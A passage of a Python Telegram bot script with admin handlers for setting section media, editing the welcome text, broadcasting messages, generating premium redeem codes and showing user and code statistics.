        ("viki", "Viki Checker"),
    ]
    for key, label in sections:
        markup.add(types.InlineKeyboardButton(label, callback_data=f"set_media_{key}"))
    markup.add(ikb("Back", callback_data="admin_back", style="danger"))
    bot.edit_message_text(f"{EMOJIS['media']} <b>Select section to set media:</b> {EMOJIS['media']}", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_media_"))
def admin_set_media_section(call):
    if not is_admin(call.from_user.id): return
    section_key = call.data.replace("set_media_", "")
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("Photo", callback_data=f"media_type_{section_key}_photo"),
        types.InlineKeyboardButton("GIF", callback_data=f"media_type_{section_key}_gif"),
        types.InlineKeyboardButton("Video", callback_data=f"media_type_{section_key}_video"),
        types.InlineKeyboardButton("Sticker", callback_data=f"media_type_{section_key}_sticker")
    )
    markup.add(ikb("Back", callback_data="admin_set_media", style="danger"))
    bot.edit_message_text(f"{EMOJIS['media']} <b>Set Media for {section_key}</b> {EMOJIS['media']}\n\nChoose media type:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("media_type_"))
def admin_select_media_type(call):
    if not is_admin(call.from_user.id): return
    # format: media_type_<section>_<type>
    rest = call.data[len("media_type_"):]
    # type is last token after final _
    if "_" not in rest:
        bot.answer_callback_query(call.id, "Invalid", show_alert=True); return
    section_key, media_type = rest.rsplit("_", 1)
    if media_type == "sticker":
        msg = bot.send_message(call.message.chat.id, f"Set Sticker for <b>{section_key}</b>\n\nSend a sticker or paste sticker file_id:\n\nType /cancel to cancel", parse_mode='HTML')
        bot.register_next_step_handler(msg, handle_sticker_input, section_key=section_key)
    elif media_type == "video":
        msg = bot.send_message(call.message.chat.id, f"Set Video for <b>{section_key}</b>\n\nSend a video file:\n\nType /cancel to cancel", parse_mode='HTML')
        bot.register_next_step_handler(msg, handle_photo_gif_upload, section_key=section_key, media_type="video")
    else:
        label = media_type.upper()
        msg = bot.send_message(call.message.chat.id, f"Set {label} for <b>{section_key}</b>\n\nSend the file:\n\nType /cancel to cancel", parse_mode='HTML')
        bot.register_next_step_handler(msg, handle_photo_gif_upload, section_key=section_key, media_type=media_type)


def handle_sticker_input(message, section_key):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    settings = load_bot_settings()
    if "media" not in settings: settings["media"] = {}
    if message.sticker:
        file_id = message.sticker.file_id
        settings["media"][section_key] = {"type": "sticker", "file_id": file_id}
        save_bot_settings(settings)
        bot.send_message(message.chat.id, f"{EMOJIS['success']} Sticker set for {section_key}! {EMOJIS['success']}"); bot.send_sticker(message.chat.id, file_id)
    elif message.text:
        file_id = message.text.strip()
        if file_id.startswith("CAAC"):
            settings["media"][section_key] = {"type": "sticker", "file_id": file_id}
            save_bot_settings(settings)
            bot.send_message(message.chat.id, f"{EMOJIS['success']} Sticker file_id set for {section_key}! {EMOJIS['success']}"); 
            try: bot.send_sticker(message.chat.id, file_id)
            except: bot.send_message(message.chat.id, f"{EMOJIS['warn']} Invalid sticker file_id {EMOJIS['warn']}")
        else:
            bot.send_message(message.chat.id, f"{EMOJIS['error']} Invalid sticker file_id. Must start with 'CAAC' {EMOJIS['error']}")

def handle_photo_gif_upload(message, section_key, media_type):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    file_obj = None
    ext = ".jpg"
    if media_type == "gif":
        file_obj = message.animation or (message.document if message.document else None)
        ext = ".gif"
    elif media_type == "video":
        file_obj = message.video or (message.document if message.document else None)
        ext = ".mp4"
    else:
        file_obj = message.photo[-1] if message.photo else (message.document if message.document else None)
        ext = ".jpg"
    if not file_obj:
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Please send a valid file! {EMOJIS['error']}"); return
    try:
        file_info = bot.get_file(file_obj.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        filename = f"media_{section_key}{ext}"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        settings = load_bot_settings()
        if "media" not in settings:
            settings["media"] = {}
        # store path + telegram file_id when useful
        entry = {"type": media_type, "path": filename}
        if hasattr(file_obj, "file_id"):
            entry["file_id"] = file_obj.file_id
        settings["media"][section_key] = entry
        save_bot_settings(settings)
        bot.send_message(message.chat.id, f"{EMOJIS['success']} {media_type.capitalize()} set for {section_key}! {EMOJIS['success']}")
        with open(filename, 'rb') as f:
            if media_type == "gif":
                bot.send_animation(message.chat.id, f)
            elif media_type == "video":
                bot.send_video(message.chat.id, f)
            else:
                bot.send_photo(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Error: {e} {EMOJIS['error']}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_back")
def admin_back(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    if not is_admin(call.from_user.id):
        return
    admin_panel(call.message)

@bot.callback_query_handler(func=lambda call: call.data == "admin_set_txt")
def admin_set_txt(call):
    if not is_admin(call.from_user.id): return
    msg = bot.send_message(call.message.chat.id, f"{EMOJIS['input']} Send the new welcome text:\nType /cancel to cancel")
    bot.register_next_step_handler(msg, handle_welcome_txt)

def handle_welcome_txt(message):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    settings = load_bot_settings(); settings["welcome_text"] = message.text; save_bot_settings(settings)
    bot.send_message(message.chat.id, e_line("Welcome text updated!", "success", "spark", 2))

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def admin_broadcast(call):
    if not is_admin(call.from_user.id): return
    msg = bot.send_message(call.message.chat.id, f"{EMOJIS['channel']} Send message to broadcast:\nType /cancel to cancel")
    bot.register_next_step_handler(msg, handle_broadcast)

def handle_broadcast(message):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    users = load_users()
    sent, failed = 0, 0
    prog = bot.send_message(message.chat.id, f"{EMOJIS['channel']} Broadcasting to {len(users)} users...\nSent: 0/{len(users)}")
    for uid in users.keys():
        try:
            bot.send_message(int(uid), message.text, parse_mode='HTML')
            sent += 1
        except: failed += 1
        if sent % 10 == 0:
            try: bot.edit_message_text(f"{EMOJIS['channel']} Broadcasting...\n{EMOJIS['success']} Sent: {sent} {EMOJIS['success']}\n{EMOJIS['error']} Failed: {failed} {EMOJIS['error']}", message.chat.id, prog.message_id)
            except: pass
    bot.send_message(message.chat.id, "\n".join([e_line("Broadcast Complete!", "success", "party", 0), e_line(f"Sent: {sent}", "ok1", "thumb", 1), e_line(f"Failed: {failed}", "error", "warn", 2)]))

@bot.callback_query_handler(func=lambda call: call.data == "admin_gen")
def admin_gen(call):
    if not is_admin(call.from_user.id): return
    msg = bot.send_message(call.message.chat.id, f"{EMOJIS['code']} Send format: <code>duration quantity</code>\n\nExamples:\n<code>30 10</code> (30 days, 10 codes)\n<code>1m 5</code> (1 month, 5 codes)\n<code>1y 2</code> (1 year, 2 codes)\n\nType /cancel to cancel", parse_mode='HTML')
    bot.register_next_step_handler(msg, handle_gen_codes)

def handle_gen_codes(message):
    if message.text and message.text == "/cancel":
        bot.send_message(message.chat.id, e_line("Cancelled", "error", "no", 1)); return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, f"{EMOJIS['error']} Invalid format. Use: duration quantity {EMOJIS['error']}"); return
        duration_str, qty_str = parts
        days = parse_duration_to_days(duration_str)
        qty = int(qty_str)
        codes = load_redeem_codes()
        generated = []
        for _ in range(qty):
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            codes[code] = {"days": days, "expires": (datetime.now() + timedelta(days=365)).isoformat(), "used": False, "created_at": datetime.now().isoformat()}
            generated.append(code)
        save_redeem_codes(codes)
        filename = f"redeem_codes_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for code in generated: f.write(f"{code} - {days} days\n")
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"{EMOJIS['success']} Generated {qty} codes ({days} days) {EMOJIS['success']}")
        os.remove(filename)
    except Exception as e:
        bot.send_message(message.chat.id, f"{EMOJIS['error']} Error: {e} {EMOJIS['error']}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def admin_stats(call):
    if not is_admin(call.from_user.id): return
    users = load_users()
    codes = load_redeem_codes()
    settings = load_bot_settings()
    bot.send_message(call.message.chat.id, "\n".join([
        e_line("<b>Bot Stats</b>", "stats", "chart", 0),
        e_line(f"Total Users: {len(users)}", "robot", "thumb", 1),
        e_line(f"Premium: {sum(1 for u in users.values() if u.get('is_premium'))}", "diamond", "crown", 2),
        e_line(f"Total Codes: {len(codes)}", "code", "gift1", 3),
        e_line(f"Used Codes: {sum(1 for c in codes.values() if c.get('used'))}", "ok1", "tick", 4),
        e_line(f"Custom Checkers: {len(settings.get('custom_checkers', []))}", "tool", "spark", 5),
        e_line(f"Force Join Channels: {len(settings.get('force_join_channels', []))}", "channel", "megaphone", 6),
    ]), parse_mode='HTML')

@bot.message_handler(commands=['cancel'])
def cancel_op(message):
    bot.send_message(message.chat.id, e_line("Operation cancelled", "error", "no", 0))

def main():
    """Start bot once. No auto-restart loop."""
    logger.info("Starting bot... settings/media kept")
    settings = load_bot_settings()
    for key, config in (settings.get("media") or {}).items():
        if not isinstance(config, dict):
            continue
        if config.get("type") in ("photo", "gif", "video") and config.get("path"):
            p = config["path"]
            if p and not os.path.exists(p):
                try:
                    open(p, "a").close()
                except Exception:
                    pass
    try:
        bot.delete_webhook(drop_pending_updates=False)
        logger.info("Webhook cleared for polling")
    except Exception as e:
        logger.warning("delete_webhook: %s", e)
    bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=40)

if __name__ == "__main__":
    main()